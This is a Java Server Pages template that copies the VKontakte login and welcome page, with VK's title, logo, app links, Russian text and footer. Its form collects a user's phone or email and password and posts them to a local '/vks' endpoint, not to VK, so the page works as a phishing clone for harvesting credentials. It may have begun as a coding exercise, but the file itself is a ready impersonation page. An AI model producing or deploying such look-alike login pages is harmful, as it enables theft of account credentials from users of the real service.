<%--
  Created by IntelliJ IDEA.
  User: malenchev
  Date: 15.01.2020
  Time: 10:01
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Добро пожаловать | ВКонтакте</title>
    <link rel="stylesheet" type="text/css" href="css/vk.css">
    <link rel="stylesheet" type="text/css" href="css/all.min.css">
</head>
<body>
<div class="header">
    <img src="images/vklogo.jpg" height="20px"/>
    <input id="searchInput" type="text" name="search" placeholder="Поиск">
    <i class="fas fa-search" id="sss"></i>
</div>
<div class="content">
    <h2>ВКонтакте для мобильных устройств</h2>
    Установите официальное мобильное приложение ВКонтакте и оставайтесь <br>
    в курсе новостей Ваших друзей, где бы Вы ни находились. <br>
    <a href="https://play.google.com/store/apps/details?id=com.vkontakte.android"><img id="and" src="images/android.png" width="180px" /></a>
    <a href="https://apps.apple.com/ru/app/id564177498"><img id="iph" src="images/iphone.png" width="190px" /></a> <br> <br>

    <a href="https://play.google.com/store/apps/details?id=com.vkontakte.android"> <button class="and_button" >VK для Android</button></a>
    <a href="https://apps.apple.com/ru/app/id564177498"><button class="iph_button" name="iphone">VK для iPhone</button></a>

    <div class="container">
        <form action="/vks" method="post">
            <div class="dws-input">
                <input class="inputBut" type="text" name="username" placeholder="Телефон или email" /> <br>
                <input class="inputBut" type="password" name="password" placeholder="Пароль" />
                <input class="dws-submit" type="submit" name="submit" value="Войти" />
            </div>
        </form>

    </div>
</div>
<div class="footer">
    <a id="line" href="https://vk.com/about" style="text-decoration: none" >ВКонтакте</a> © 2006–2020
    <a href="https://vk.com/about"style="text-decoration: none">О ВКонтакте</a>
    <a href="https://vk.com/ads"style="text-decoration: none">Реклама</a>
</div>
</body>
</html>
